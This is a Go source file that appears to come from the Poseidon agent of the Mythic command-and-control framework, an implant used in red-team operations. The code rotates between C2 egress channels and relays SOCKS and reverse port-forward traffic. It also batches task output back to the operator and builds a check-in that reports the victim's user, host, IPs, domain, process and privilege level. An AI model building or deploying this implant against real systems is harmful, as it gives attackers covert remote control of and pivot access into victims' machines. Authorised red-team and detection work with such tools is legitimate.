package profiles

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"strconv"
	"strings"
	"sync"
	"time"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// these are stamped in variables as part of build time
var (
	// UUID is a per-payload identifier assigned by Mythic during creation
	UUID string
	// egress_order is a dictionary of c2 profiles and their intended connection orders
	// this is input as a string from the compilation step, so we have to parse it out
	egress_order string
	// egress_failover is the method of determining how/when to swap to another c2 profile
	egress_failover string
	// debugString
	debugString string
	// failoverThresholdString
	failedConnectionCountThresholdString string
)

// these are internal representations and other variables
var (

	// debug
	debug bool
	// currentConnectionID is which fallback profile we're currently running
	currentConnectionID    = 0
	failedConnectionCounts map[string]int
	// failedConnectionCountThreshold is how many failed attempts before rotating
	failedConnectionCountThreshold = 10
	// egressOrder the priority for starting and running egress profiles
	egressOrder map[string]int
	// MythicID is the callback UUID once this payload finishes staging
	MythicID = ""
	// SeededRand is used when generating a random value for EKE
	SeededRand = rand.New(rand.NewSource(time.Now().UnixNano()))
	// TaskResponses is an array of responses for Mythic
	TaskResponses []structs.Response
	// TaskInteractiveResponses is an array of interactive messages for Mythic
	TaskInteractiveResponses []structs.InteractiveTaskMessage
	// DelegateResponses is an array of messages from delegates to go to Mythic
	DelegateResponses []structs.DelegateMessage
	// P2PConnectionMessages is an array of P2P add/remove messages for Mythic
	P2PConnectionMessages []structs.P2PConnectionMessage
	// AlertResponses is an array of alert notifications for the operator
	AlertResponses []structs.Alert
	// channel to process normal messages from P2P connection
	HandleInboundMythicMessageFromEgressP2PChannel = make(chan structs.MythicMessageResponse, 10)

	mu sync.Mutex
	// process SOCKSv5 Messages from Mythic
	FromMythicSocksChannel = make(chan structs.SocksMsg, 100)
	FromMythicRpfwdChannel = make(chan structs.SocksMsg, 100)
	// send SOCKSv5 Messages to Mythic
	InterceptToMythicSocksChannel = make(chan structs.SocksMsg, 100)
	toMythicSocksChannel          = make(chan structs.SocksMsg, 100)
	InterceptToMythicRpfwdChannel = make(chan structs.SocksMsg, 100)
	toMythicRpfwdChannel          = make(chan structs.SocksMsg, 100)
	// interactive tasks channel
	NewInteractiveTaskOutputChannel = make(chan structs.InteractiveTaskMessage, 100)
	NewAlertChannel                 = make(chan structs.Alert, 10)
	// channel processes responses that should go out and directs them towards the egress direction
	NewResponseChannel          = make(chan structs.Response, 10)
	NewDelegatesToMythicChannel = make(chan structs.DelegateMessage, 10)
	P2PConnectionMessageChannel = make(chan structs.P2PConnectionMessage, 10)

	availableC2Profiles      = make(map[string]structs.Profile)
	availableC2ProfilesMutex sync.RWMutex
)

func AddAvailableProfile(newProfile structs.Profile) {
	availableC2ProfilesMutex.Lock()
	defer availableC2ProfilesMutex.Unlock()
	availableC2Profiles[newProfile.ProfileName()] = newProfile
}

// gather the delegate messages that need to go out the egress channel into a central location
func aggregateDelegateMessagesToMythic() {
	for {
		response := <-NewDelegatesToMythicChannel
		pushChan := GetPushChannel()
		if pushChan != nil {
			pushChan <- structs.MythicMessage{
				Action:    "post_response",
				Delegates: &[]structs.DelegateMessage{response},
			}
		} else {
			mu.Lock()
			DelegateResponses = append(DelegateResponses, response)
			mu.Unlock()
		}
	}
}

// gather the edge notifications that need to go out the egress channel
func aggregateEdgeAnnouncementsToMythic() {
	for {
		response := <-P2PConnectionMessageChannel
		pushChan := GetPushChannel()
		if pushChan != nil {
			pushChan <- structs.MythicMessage{
				Action: "post_response",
				Edges:  &[]structs.P2PConnectionMessage{response},
			}
		} else {
			mu.Lock()
			P2PConnectionMessages = append(P2PConnectionMessages, response)
			mu.Unlock()
		}
	}
}

// gather the responses from the task go routines into a central location
func aggregateResponses(removeRunningTasksChannel chan string) {
	for {
		select {
		case response := <-NewResponseChannel:
			if response.Completed {
				// We need to remove this job from our list of jobs
				go func() {
					removeRunningTasksChannel <- response.TaskID
				}()
			}
			pushChan := GetPushChannel()
			if pushChan != nil {
				pushChan <- structs.MythicMessage{
					Action:    "post_response",
					Responses: &[]structs.Response{response},
				}
			} else {
				mu.Lock()
				TaskResponses = append(TaskResponses, response)
				mu.Unlock()
			}
		case response := <-NewInteractiveTaskOutputChannel:
			pushChan := GetPushChannel()
			if pushChan != nil {
				pushChan <- structs.MythicMessage{
					Action:           "post_response",
					InteractiveTasks: &[]structs.InteractiveTaskMessage{response},
				}
			} else {
				mu.Lock()
				TaskInteractiveResponses = append(TaskInteractiveResponses, response)
				mu.Unlock()
			}
		case response := <-NewAlertChannel:
			pushChan := GetPushChannel()
			if pushChan != nil {
				PrintDebug("adding new alert to pushChan")
				pushChan <- structs.MythicMessage{
					Action: "post_response",
					Alerts: &[]structs.Alert{response},
				}
			} else {
				PrintDebug("adding new alert to alert responses")
				mu.Lock()
				AlertResponses = append(AlertResponses, response)
				mu.Unlock()
			}
		}
	}
}

func aggregateSocksTrafficToMythic() {
	for {
		response := <-InterceptToMythicSocksChannel
		pushChan := GetPushChannel()
		if pushChan != nil {
			pushChan <- structs.MythicMessage{
				Action: "post_response",
				Socks:  &[]structs.SocksMsg{response},
			}
		} else {
			// if there's no push channel, forward it along like normal for somebody else to get it
			toMythicSocksChannel <- response
		}
	}
}
func aggregateRpfwdTrafficToMythic() {
	for {
		response := <-InterceptToMythicRpfwdChannel
		pushChan := GetPushChannel()
		if pushChan != nil {
			pushChan <- structs.MythicMessage{
				Action: "post_response",
				Rpfwds: &[]structs.SocksMsg{response},
			}
		} else {
			// if there's no push channel, forward it along like normal for somebody else to get it
			toMythicRpfwdChannel <- response
		}
	}
}

func Initialize(removeRunningTasksChannel chan string) {
	go aggregateDelegateMessagesToMythic()
	go aggregateEdgeAnnouncementsToMythic()
	go aggregateResponses(removeRunningTasksChannel)
	go aggregateSocksTrafficToMythic()
	go aggregateRpfwdTrafficToMythic()
	if debugString == "" || strings.ToLower(debugString) == "false" {
		debug = false
	} else {
		debug = true
	}
}
func PrintDebug(msg string) {
	if debug {
		log.Print(msg)
	}
}
func Start() {
	parsedConnectionOrder := make(map[string]string)
	egressOrder = make(map[string]int)
	err := json.Unmarshal([]byte(egress_order), &parsedConnectionOrder)
	if err != nil {
		log.Fatalf("Failed to parse connection orders: %v", err)
	}
	failedConnectionCounts = make(map[string]int)
	for key, _ := range parsedConnectionOrder {
		egressOrder[key], err = strconv.Atoi(parsedConnectionOrder[key])
		if err != nil {
			log.Fatalf("Failed to parse connection order value: %v", err)
		}
		failedConnectionCounts[key] = 0
	}
	failedConnectionCountThreshold, err = strconv.Atoi(failedConnectionCountThresholdString)
	if err != nil {
		PrintDebug(fmt.Sprintf("Setting failedConnectionCountThreshold to 10: %v", err))
		failedConnectionCountThreshold = 10
	}
	// start one egress
	availableC2ProfilesMutex.RLock()
	for egressC2, val := range egressOrder {
		if val == currentConnectionID {
			foundCurrentConnection := false
			for availableC2, _ := range availableC2Profiles {
				if !availableC2Profiles[availableC2].IsP2P() && availableC2 == egressC2 {
					PrintDebug(fmt.Sprintf("starting: %s\n", availableC2))
					go availableC2Profiles[availableC2].Start()
					foundCurrentConnection = true
					break
				}
			}
			if foundCurrentConnection {
				break
			} else {
				currentConnectionID = currentConnectionID + 1
				if currentConnectionID > len(availableC2Profiles) {
					//log.Fatal("Failed to find available c2, exiting")
					break
				}
			}
		}
	}

	// start p2p
	for c2, _ := range availableC2Profiles {
		if availableC2Profiles[c2].IsP2P() {
			PrintDebug(fmt.Sprintf("starting: %s\n", c2))
			go availableC2Profiles[c2].Start()
		}
	}
	availableC2ProfilesMutex.RUnlock()
	// wait forever
	forever := make(chan bool, 1)
	<-forever
}
func IncrementFailedConnection(c2Name string) {
	failedConnectionCounts[c2Name] += 1
	if failedConnectionCounts[c2Name] > failedConnectionCountThreshold {
		go StartNextEgress(c2Name)
		failedConnectionCounts[c2Name] = 0
	}
}

// StartNextEgress automatically called when failed connection count >= threshold
func StartNextEgress(failedConnectionC2Profile string) {
	// first stop the current egress
	PrintDebug("Looping to start next egress protocol")
	for key, _ := range egressOrder {
		if key == failedConnectionC2Profile {
			for c2, _ := range availableC2Profiles {
				if !availableC2Profiles[c2].IsP2P() && c2 == key {
					PrintDebug(fmt.Sprintf("stopping: %s\n", c2))
					failedConnectionCounts[c2] = 0
					availableC2Profiles[c2].Stop()
					break
				}
			}
		}
	}
	egressC2StillRunning := false
	for c2, _ := range availableC2Profiles {
		if !availableC2Profiles[c2].IsP2P() && availableC2Profiles[c2].IsRunning() {
			egressC2StillRunning = true
		}
	}
	startedC2 := ""
	if !egressC2StillRunning {
		PrintDebug(fmt.Sprintf("No more egress c2 profiles running, start the next\n"))
		// update the connectionID and wrap around if necessary
		if egress_failover == "round-robin" {
			currentConnectionID = (currentConnectionID + 1) % len(egressOrder)
		}
		// start the next egress
		for key, val := range egressOrder {
			if val == currentConnectionID {
				for c2, _ := range availableC2Profiles {
					if !availableC2Profiles[c2].IsP2P() && c2 == key {
						PrintDebug(fmt.Sprintf("starting: %s\n", c2))
						startedC2 = c2
						failedConnectionCounts[c2] = 0
						go availableC2Profiles[c2].Start()
						break
					}
				}
			}
		}
	}
	if GetMythicID() != "" && startedC2 != "" && startedC2 != failedConnectionC2Profile {
		// we started a new c2 profile other than the one that just hit the failure count
		// send off a message to Mythic that the other connection channel is dead
		P2PConnectionMessageChannel <- structs.P2PConnectionMessage{
			Source:        GetMythicID(),
			Destination:   GetMythicID(),
			Action:        "remove",
			C2ProfileName: failedConnectionC2Profile,
		}
		source := fmt.Sprintf("poseidon: %s", GetMythicID())
		level := structs.AlertLevelInfo
		PrintDebug("adding alert to NewAlertChannel")
		NewAlertChannel <- structs.Alert{
			Alert:  fmt.Sprintf("Poseidon, %s, Stopped C2 Profile '%s' and started '%s'", GetMythicID(), failedConnectionC2Profile, startedC2),
			Source: &source,
			Level:  &level,
		}
	}
}

// GetAllC2Info collects metadata about all compiled in c2 profiles
func GetAllC2Info() string {
	output := ""
	for c2, _ := range availableC2Profiles {
		output += availableC2Profiles[c2].ProfileName() + ":\n"
		output += availableC2Profiles[c2].GetConfig() + "\n"
	}
	return output
}

// SetAllEncryptionKeys makes sure all compiled c2 profiles are updated with callback encryption information
func SetAllEncryptionKeys(newKey string) {
	for c2, _ := range availableC2Profiles {
		availableC2Profiles[c2].SetEncryptionKey(newKey)
	}
}

// StartC2Profile starts a specific c2 profile by name (usually via tasking)
func StartC2Profile(profileName string) {
	for c2, _ := range availableC2Profiles {
		if c2 == profileName {
			PrintDebug(fmt.Sprintf("Starting C2 profile by name from tasking: %s\n", profileName))
			go availableC2Profiles[c2].Start()
		}
	}
}

// StopC2Profile stops a specific c2 profile by name (usually via tasking)
func StopC2Profile(profileName string) {
	PrintDebug(fmt.Sprintf("Stopping C2 profile by name from tasking: %s\n", profileName))
	StartNextEgress(profileName)
}

// UpdateAllSleepInterval updates sleep interval for all compiled c2 profiles
func UpdateAllSleepInterval(newInterval int) string {
	output := ""
	for c2, _ := range availableC2Profiles {
		output += fmt.Sprintf("[%s] - %s", c2, availableC2Profiles[c2].SetSleepInterval(newInterval))
	}
	return output
}

// UpdateAllSleepJitter updates sleep jitter for all compiled c2 profiles
func UpdateAllSleepJitter(newJitter int) string {
	output := ""
	for c2, _ := range availableC2Profiles {
		output += fmt.Sprintf("[%s] - %s", c2, availableC2Profiles[c2].SetSleepJitter(newJitter))
	}
	return output
}

// UpdateC2Profile updates an arbitrary parameter/value for the specified c2 profile
func UpdateC2Profile(profileName string, argName string, argValue string) {
	for c2, _ := range availableC2Profiles {
		if c2 == profileName {
			availableC2Profiles[c2].UpdateConfig(argName, argValue)
		}
	}
}

// GetPushChannel gets the channel for the currently running c2 profile if one exists
func GetPushChannel() chan structs.MythicMessage {
	for c2, _ := range availableC2Profiles {
		if availableC2Profiles[c2].GetPushChannel() != nil {
			return availableC2Profiles[c2].GetPushChannel()
		}
	}
	return nil
}

// GetSleepTime gets the sleep time for the currently running c2 profile
func GetSleepTime() int {
	for c2, _ := range availableC2Profiles {
		sleep := availableC2Profiles[c2].GetSleepTime()
		if sleep >= 0 {
			return sleep
		}
	}
	return 0
}

// GetMythicID returns the current Mythic UUID
func GetMythicID() string {
	return MythicID
}

func SetMythicID(newMythicID string) {
	PrintDebug(fmt.Sprintf("Updating MythicID: %s -> %s\n", MythicID, newMythicID))
	MythicID = newMythicID
}

func GenerateSessionID() string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 20)
	for i := range b {
		b[i] = letterBytes[SeededRand.Intn(len(letterBytes))]
	}
	return string(b)
}

func getSocksChannelData() []structs.SocksMsg {
	var data = make([]structs.SocksMsg, 0)
	//fmt.Printf("***+ checking for data from toMythicSocksChannel\n")
	for {
		select {
		case msg, ok := <-toMythicSocksChannel:
			if ok {
				//fmt.Printf("Channel %d was read for post_response with length %d.\n", msg.ServerId, len(msg.Data))
				data = append(data, msg)
			} else {
				//fmt.Println("Channel closed!\n")
				return data
			}
		default:
			//fmt.Println("No Socks value ready, moving on.")
			return data
		}
	}
}
func getRpfwdChannelData() []structs.SocksMsg {
	var data = make([]structs.SocksMsg, 0)
	//fmt.Printf("***+ checking for data from toMythicSocksChannel\n")
	for {
		select {
		case msg, ok := <-toMythicRpfwdChannel:
			if ok {
				//fmt.Printf("Channel %d was read for post_response with length %d.\n", msg.ServerId, len(msg.Data))
				data = append(data, msg)
			} else {
				//fmt.Println("Channel closed!\n")
				return data
			}
		default:
			//fmt.Println("No Socks value ready, moving on.")
			return data
		}
	}
}

func CreateMythicPollMessage() *structs.MythicMessage {
	responseMsg := structs.MythicMessage{}
	responseMsg.Action = "get_tasking"
	responseMsg.TaskingSize = -1
	responseMsg.GetDelegateTasks = true
	SocksArray := getSocksChannelData()
	RpfwdArray := getRpfwdChannelData()
	if len(TaskResponses) > 0 || len(DelegateResponses) > 0 ||
		len(P2PConnectionMessages) > 0 || len(TaskInteractiveResponses) > 0 ||
		len(AlertResponses) > 0 {
		ResponseArray := make([]structs.Response, 0)
		DelegateArray := make([]structs.DelegateMessage, 0)
		P2PConnectionsArray := make([]structs.P2PConnectionMessage, 0)
		InteractiveTaskResponsesArray := make([]structs.InteractiveTaskMessage, 0)
		AlertsArray := make([]structs.Alert, 0)
		mu.Lock()
		ResponseArray = append(ResponseArray, TaskResponses...)
		DelegateArray = append(DelegateArray, DelegateResponses...)
		P2PConnectionsArray = append(P2PConnectionsArray, P2PConnectionMessages...)
		InteractiveTaskResponsesArray = append(InteractiveTaskResponsesArray, TaskInteractiveResponses...)
		AlertsArray = append(AlertsArray, AlertResponses...)
		TaskResponses = make([]structs.Response, 0)
		DelegateResponses = make([]structs.DelegateMessage, 0)
		P2PConnectionMessages = make([]structs.P2PConnectionMessage, 0)
		TaskInteractiveResponses = make([]structs.InteractiveTaskMessage, 0)
		AlertResponses = make([]structs.Alert, 0)
		mu.Unlock()
		if len(ResponseArray) > 0 {
			responseMsg.Responses = &ResponseArray
		}
		if len(DelegateArray) > 0 {
			responseMsg.Delegates = &DelegateArray
		}
		if len(P2PConnectionsArray) > 0 {
			responseMsg.Edges = &P2PConnectionsArray
		}
		if len(InteractiveTaskResponsesArray) > 0 {
			responseMsg.InteractiveTasks = &InteractiveTaskResponsesArray
		}

		if len(AlertsArray) > 0 {
			PrintDebug("adding alert to poll message")
			responseMsg.Alerts = &AlertsArray
		}
	}
	if len(SocksArray) > 0 {
		responseMsg.Socks = &SocksArray
	}
	if len(RpfwdArray) > 0 {
		responseMsg.Rpfwds = &RpfwdArray
	}
	return &responseMsg
}

func CreateCheckinMessage() structs.CheckInMessage {
	currentUser := functions.GetUser()
	hostname := functions.GetHostname()
	currIP := functions.GetCurrentIPAddress()
	currPid := functions.GetPID()
	OperatingSystem := functions.GetOS()
	arch := functions.GetArchitecture()
	processName := functions.GetProcessName()
	domain := functions.GetDomain()
	checkin := structs.CheckInMessage{
		Action:       "checkin",
		IPs:          currIP,
		OS:           OperatingSystem,
		User:         currentUser,
		Host:         hostname,
		Pid:          currPid,
		UUID:         UUID,
		Architecture: arch,
		Domain:       domain,
		ProcessName:  processName,
	}

	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}
	return checkin
}
